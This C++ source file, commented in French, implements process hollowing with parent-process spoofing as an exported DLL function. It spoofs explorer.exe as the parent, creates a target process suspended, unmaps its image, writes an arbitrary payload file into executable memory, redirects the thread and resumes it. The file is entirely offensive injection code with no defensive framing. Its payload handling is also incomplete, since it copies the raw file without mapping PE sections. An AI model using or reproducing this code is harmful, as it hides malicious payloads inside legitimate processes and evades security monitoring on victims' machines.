#include <windows.h>
#include <vector>

// Typedef pour NtUnmapViewOfSection
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

// Fonction utilitaire : lire un fichier dans un buffer mémoire
bool ReadFileToBuffer(const char* filepath, std::vector<BYTE>& buffer) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return false;
    }

    buffer.resize(fileSize);
    DWORD bytesRead = 0;
    bool readOk = ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL) && (bytesRead == fileSize);
    CloseHandle(hFile);
    return readOk;
}

// Fonction utilitaire : récupérer PID d'explorer.exe via barre des tâches
DWORD GetExplorerPID() {
    HWND hwnd = FindWindowA("Shell_TrayWnd", NULL);
    if (!hwnd) return 0;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    return pid;
}

extern "C" __declspec(dllexport)
int Hollowing(const char* targetProcessPath, const char* payloadPath) {
    std::vector<BYTE> payloadBuffer;
    if (!ReadFileToBuffer(payloadPath, payloadBuffer)) return 1; // erreur lecture payload

    DWORD ppid = GetExplorerPID();
    if (ppid == 0) return 2; // impossible de trouver explorer.exe

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ppid);
    if (!hParent) return 3;

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize)) {
        CloseHandle(hParent);
        return 4;
    }

    if (!UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL,
        NULL)) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return 5;
    }

    if (!CreateProcessA(
        targetProcessPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi)) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return 6;
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);

    HANDLE hProcess = pi.hProcess;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 7;
    }

    auto NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 8;
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 9;
    }

#ifdef _M_X64
    PVOID baseAddress = (PVOID)ctx.Rdx; // x64
#else
    PVOID baseAddress = (PVOID)ctx.Ebx; // x86
#endif

    NTSTATUS status = NtUnmapViewOfSection(hProcess, baseAddress);
    if (status != 0) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 10;
    }

    PVOID allocBase = VirtualAllocEx(hProcess, baseAddress, payloadBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocBase) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 11;
    }

    if (!WriteProcessMemory(hProcess, allocBase, payloadBuffer.data(), payloadBuffer.size(), NULL)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 12;
    }

#ifdef _M_X64
    ctx.Rcx = (DWORD64)allocBase;  // Adresse d'entrée à ajuster selon le PE
#else
    ctx.Eax = (DWORD)allocBase;    // Idem pour x86
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 13;
    }

    if (ResumeThread(pi.hThread) == -1) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 14;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0; // succès
}
